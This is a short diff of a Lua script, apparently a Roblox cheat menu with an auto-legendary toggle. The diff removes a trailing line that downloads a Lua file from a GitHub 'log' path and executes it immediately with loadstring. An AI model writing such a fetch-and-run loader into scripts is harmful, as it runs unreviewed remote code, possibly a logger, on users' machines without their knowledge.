@@ -176,7 +176,3 @@ local Toggle = chestTab:CreateToggle({
         autolegendary()
 	end,
 })
-
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Iratethisname10/Blackout/main/log/bablog.lua"))()
